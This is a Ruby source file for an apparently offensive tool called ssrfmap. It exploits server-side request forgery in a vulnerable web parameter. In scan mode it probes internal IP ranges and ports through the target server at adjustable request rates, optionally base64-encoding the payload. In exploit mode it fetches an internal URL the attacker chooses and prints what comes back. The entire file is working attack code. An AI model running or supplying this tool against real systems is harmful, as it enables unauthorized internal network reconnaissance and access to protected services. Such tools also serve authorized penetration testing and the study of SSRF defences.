##
# This script was not intended to be well written, read it at your own risk.
##

#!/usr/bin/env ruby

require 'typhoeus' # External dependency
require 'netaddr'  # External dependency
require 'uri'
require 'optparse'
require 'base64'
require_relative './resources/ports.rb'
require_relative './resources/ports-all.rb'

options = {}

# Default values
options[:agv_level] = "3"
options[:ports] = $ports

# Requests counter
$global_request_counter = 0

# Clean SIGINT output
trap("SIGINT") { puts "\nBye!"; exit! }

OptionParser.new do |opts|
  opts.banner = "Usage example: ssrfmap.rb -u http://www.example.com/func.php?url=_SSRF_\nSee -h for help."
  options[:banner] = opts.banner

  opts.on("-u URL", "--url URL", "[Required] Vulnerable URL") do |d|
    options[:url] = d
  end

  opts.on("-r TARGET RANGE", "--range TARGET RANGE", "[Optional] Target IP range to scan by CIDR (default: 127.0.0.1/32") do |d|
    options[:range] = d
  end

  opts.on("-t TARGET URL", "--target TARGET URL", "[Optional] Target URL address or hostname") do |d|
    options[:target] = d
  end

  opts.on("-d POST_PARAMETERS","--data POST_PARAMETERS", "[Optional] POST parameters quoted: 'param1=a&param2=b'") do |d|
    options[:post_data] = d
  end

  opts.on("-m METHOD","--method METHOD", "[Optional] HTTP Verb to use, default is GET") do |d|
    options[:method] = d
  end

  opts.on("--regex REGEX", "[Optional] String to identify false results (in case target always returns 200 OK)") do |d|
    options[:regex] = d
  end

  opts.on("-l LENGTH","--length LENGTH", "[Optional] Response length to identify false results (in case target always returns 200 OK)") do |d|
    options[:length] = d
  end

  opts.on("-T LEVEL","--threads LEVEL", "[Optional] Aggressivity level [1,2,3,4,5], more aggressive means more requests per second. Default: 3)") do |d|
    options[:agv_level] = d
  end

  opts.on("-p PORT","--port PORT", "[Optional] Scans for one port") do |d|
    options[:ports] = "#{d},"
  end

  opts.on("-A","--all", "[Optional] Scan all ports (only in scan mode)") do |d|
    options[:ports] = $portsall
  end

  opts.on("--base64", "[Optional] Encode payload in base64") do |d|
    options[:base64] = true
  end

  opts.on("-h", "--help", "Prints this help") do
    puts opts
    exit
  end

end.parse!

# Clunky
$options = options

# Aggresivity level map: level => requests per second
$aggresivity = {
  "1" => 1,
  "2" => 5,
  "3" => 15,
  "4" => 35,
  "5" => 55
}

if !options[:url]
  puts options[:banner]
  exit
end

#
# uri => Original URI with "_SSRF_"
# ssrf_uri => URI to inject
#
def inject(uri,ssrf_uri)
  return uri.gsub("_SSRF_",ssrf_uri)
end

#
# final_uri => Defines target uri.
# http_method => Defines HTTP method to use on request.
# body => Defines request body, if not defined it will be "" by default.
# mode => Defines if script is running on "exploit" mode or just "scan" mode.
# ssrf_uri => Injected URI
# regex => If a regex is defined to match on false 200OK responses.
#

def get_result(final_uri,http_method,body,mode,ssrf_uri,regex)

  if body && body[0] == "{" then # Its JSON
    content_type = 'application/json'
  else
    content_type = 'application/x-www-form-urlencoded'
  end

  #puts "Requesting: " + final_uri.to_s
  request = Typhoeus::Request.new(
    "#{final_uri}",
    method: http_method.to_sym,
    body: body,
    headers: { Host: "#{URI(final_uri).host}", Referer: "http://#{URI(final_uri).host}", 'Content-Type' => content_type }
  )

  request.on_complete do |response|
    $global_request_counter += 1
    STDOUT.flush
    print "[...] Completed requests: #{$global_request_counter.to_s}/#{$options[:ports].split(',').length.to_s}\r"

    if $options[:base64] then
      ssrf_uri = Base64.decode64 ssrf_uri
    end

    # There are a few cases to take in account when producing the output
    if response.success? && response.response_body then
      if $options[:length] && $options[:length] == response.response_body.length.to_s then
        # Do nothing, changeme if you want
      elsif regex && response.response_body.include?(regex)
        # Do nothing, changeme if you want
      else
        if mode == "exploit" then
          puts response.response_body
        else
          puts "[*] Found service on port: " + ssrf_uri + " | Length: " + response.response_body.length.to_s
        end
     end
    elsif response.timed_out?  
      puts "[*] Found service on port: " + ssrf_uri
    elsif response.code == 0
      puts(response.return_message)
    else
      if mode == "exploit" then
        puts("HTTP request failed: " + response.code.to_s)
      end
    end
  end

  return request
end

#      #
# MAIN #
#      #

uri = URI(options[:url])
host = uri.host
port = uri.port
path = uri.path
post_data = options[:post_data] || nil

target_range = options[:range] || "127.0.0.1/32"
regex = options[:regex]

if options[:post_data] && !options[:method]
  http_method = :post
else
  http_method = options[:method] || :get
end

#
# => User defined a target, let's try to exploit it
#
if options[:target] then
  target_uri = URI(options[:target])
  target_prt = target_uri.scheme
  target_host = target_uri.host
  target_path = target_uri.path
  target_port = target_uri.port

  ssrf_uri = "#{target_prt}://#{target_host}:#{target_port}#{target_path}"
  if options[:base64] then
    ssrf_uri = Base64.encode64 ssrf_uri
  end
  if http_method == :get then
    uri = URI(inject(options[:url],ssrf_uri))
  elsif http_method == :post then
    post_data = inject(post_data,ssrf_uri)
  end

  get_result(uri,http_method,post_data,"exploit",ssrf_uri,regex).run
  exit
end

#
# => User does not specified any target, let's find some one!
#
target_prt = "http"
target_range = NetAddr::CIDR.create(target_range)
puts "Running on scan mode:\nTarget: #{target_range}\nProtocol: #{target_prt}"

for i in 0..target_range.size-1 do
  hydra = Typhoeus::Hydra.new(max_concurrency: $aggresivity[$options[:agv_level]].to_i)

  target_host = target_range[i]

  # Queue each request on a Hydra Queue
  options[:ports].split(',').each do |target_port|
    ssrf_uri = "#{target_prt}://#{target_host.to_s.split('/')[0]}:#{target_port}"

    if options[:base64] then
      ssrf_uri = Base64.encode64 ssrf_uri
    end

    if http_method == :get then
      injected_uri = URI(inject(options[:url],ssrf_uri))
    elsif http_method == :post then
      injected_post_data = inject(post_data,ssrf_uri)
    end
    hydra.queue get_result(injected_uri || uri,http_method,injected_post_data || post_data,"scan",ssrf_uri,regex)
  end

  puts "[*] Queueing requests for #{target_host.to_s.split('/')[0]}..."
  hydra.run
end